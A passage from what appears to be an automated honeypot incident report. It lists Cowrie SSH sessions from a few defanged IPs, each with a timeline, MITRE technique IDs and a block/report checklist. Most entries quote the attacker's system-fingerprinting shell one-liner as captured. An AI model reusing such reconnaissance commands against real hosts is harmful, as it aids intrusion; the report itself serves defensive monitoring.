| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:21` | `cowrie.log.closed` |
| `2026-07-05 05:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00fcfa542c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:55 |
| **Last Seen** | 2026-07-05 05:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:55:32` | `cowrie.session.connect` |
| `2026-07-05 05:55:33` | `cowrie.client.version` |
| `2026-07-05 05:55:33` | `cowrie.client.kex` |
| `2026-07-05 05:55:37` | `cowrie.login.success` |
| `2026-07-05 05:55:41` | `cowrie.session.params` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.success` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:41` | `cowrie.command.input` |
| `2026-07-05 05:55:42` | `cowrie.log.closed` |
| `2026-07-05 05:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c75c3ec99130

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:56 |
| **Last Seen** | 2026-07-05 05:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:56:34` | `cowrie.session.connect` |
| `2026-07-05 05:56:35` | `cowrie.client.version` |
| `2026-07-05 05:56:35` | `cowrie.client.kex` |
| `2026-07-05 05:56:39` | `cowrie.login.success` |
| `2026-07-05 05:56:41` | `cowrie.session.params` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.success` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:41` | `cowrie.command.input` |
| `2026-07-05 05:56:42` | `cowrie.log.closed` |
| `2026-07-05 05:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9e57a3538a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:56 |
| **Last Seen** | 2026-07-05 05:57 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:56:56` | `cowrie.session.connect` |
| `2026-07-05 05:56:57` | `cowrie.client.version` |
| `2026-07-05 05:56:57` | `cowrie.client.kex` |
| `2026-07-05 05:57:01` | `cowrie.login.success` |
| `2026-07-05 05:57:03` | `cowrie.session.params` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.success` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:03` | `cowrie.command.input` |
| `2026-07-05 05:57:06` | `cowrie.log.closed` |
| `2026-07-05 05:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6e561d7d02

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:57 |
| **Last Seen** | 2026-07-05 05:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:57:57` | `cowrie.session.connect` |
| `2026-07-05 05:57:58` | `cowrie.client.version` |
| `2026-07-05 05:57:58` | `cowrie.client.kex` |
| `2026-07-05 05:58:02` | `cowrie.login.success` |
| `2026-07-05 05:58:04` | `cowrie.session.params` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.success` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:04` | `cowrie.command.input` |
| `2026-07-05 05:58:05` | `cowrie.log.closed` |
| `2026-07-05 05:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0537c1601518

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:58 |
| **Last Seen** | 2026-07-05 05:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:58:21` | `cowrie.session.connect` |
| `2026-07-05 05:58:22` | `cowrie.client.version` |
| `2026-07-05 05:58:22` | `cowrie.client.kex` |
| `2026-07-05 05:58:25` | `cowrie.login.success` |
| `2026-07-05 05:58:26` | `cowrie.session.params` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.success` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:26` | `cowrie.command.input` |
| `2026-07-05 05:58:27` | `cowrie.log.closed` |
| `2026-07-05 05:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd2861ed334

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:59 |
| **Last Seen** | 2026-07-05 05:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:59:20` | `cowrie.session.connect` |
| `2026-07-05 05:59:21` | `cowrie.client.version` |
| `2026-07-05 05:59:21` | `cowrie.client.kex` |
| `2026-07-05 05:59:24` | `cowrie.login.success` |
| `2026-07-05 05:59:27` | `cowrie.session.params` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.success` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:27` | `cowrie.command.input` |
| `2026-07-05 05:59:28` | `cowrie.log.closed` |
| `2026-07-05 05:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af9b1e35ce1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:59 |
| **Last Seen** | 2026-07-05 05:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:59:45` | `cowrie.session.connect` |
| `2026-07-05 05:59:45` | `cowrie.client.version` |
| `2026-07-05 05:59:45` | `cowrie.client.kex` |
| `2026-07-05 05:59:49` | `cowrie.login.success` |
| `2026-07-05 05:59:51` | `cowrie.session.params` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.success` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:51` | `cowrie.command.input` |
| `2026-07-05 05:59:54` | `cowrie.log.closed` |
| `2026-07-05 05:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e432bba9f6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 06:00 |
| **Last Seen** | 2026-07-05 06:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:00:26` | `cowrie.session.connect` |
| `2026-07-05 06:00:27` | `cowrie.client.version` |
| `2026-07-05 06:00:27` | `cowrie.client.kex` |
| `2026-07-05 06:00:34` | `cowrie.login.success` |
| `2026-07-05 06:00:38` | `cowrie.session.params` |
| `2026-07-05 06:00:38` | `cowrie.command.input` |
| `2026-07-05 06:00:39` | `cowrie.log.closed` |
| `2026-07-05 06:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607ade27376b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:00 |
| **Last Seen** | 2026-07-05 06:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:00:45` | `cowrie.session.connect` |
| `2026-07-05 06:00:46` | `cowrie.client.version` |
| `2026-07-05 06:00:46` | `cowrie.client.kex` |
| `2026-07-05 06:00:51` | `cowrie.login.success` |
| `2026-07-05 06:00:53` | `cowrie.session.params` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.success` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:53` | `cowrie.command.input` |
| `2026-07-05 06:00:54` | `cowrie.log.closed` |
| `2026-07-05 06:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6511a5dffc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:01 |
| **Last Seen** | 2026-07-05 06:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:01:08` | `cowrie.session.connect` |
| `2026-07-05 06:01:09` | `cowrie.client.version` |
| `2026-07-05 06:01:09` | `cowrie.client.kex` |
| `2026-07-05 06:01:13` | `cowrie.login.success` |
| `2026-07-05 06:01:15` | `cowrie.session.params` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.success` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:15` | `cowrie.command.input` |
| `2026-07-05 06:01:18` | `cowrie.log.closed` |
| `2026-07-05 06:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d4ff2cc367

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:02 |
| **Last Seen** | 2026-07-05 06:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:02:17` | `cowrie.session.connect` |
| `2026-07-05 06:02:18` | `cowrie.client.version` |
| `2026-07-05 06:02:18` | `cowrie.client.kex` |
| `2026-07-05 06:02:21` | `cowrie.login.success` |
| `2026-07-05 06:02:23` | `cowrie.session.params` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.success` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:23` | `cowrie.command.input` |
| `2026-07-05 06:02:25` | `cowrie.log.closed` |
| `2026-07-05 06:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-815955347e58

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:02 |
| **Last Seen** | 2026-07-05 06:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:02:33` | `cowrie.session.connect` |
| `2026-07-05 06:02:34` | `cowrie.client.version` |
| `2026-07-05 06:02:34` | `cowrie.client.kex` |
| `2026-07-05 06:02:37` | `cowrie.login.success` |
| `2026-07-05 06:02:39` | `cowrie.session.params` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.success` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:39` | `cowrie.command.input` |
| `2026-07-05 06:02:40` | `cowrie.log.closed` |
| `2026-07-05 06:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f419e9033847

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:03 |
| **Last Seen** | 2026-07-05 06:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:03:47` | `cowrie.session.connect` |
| `2026-07-05 06:03:48` | `cowrie.client.version` |
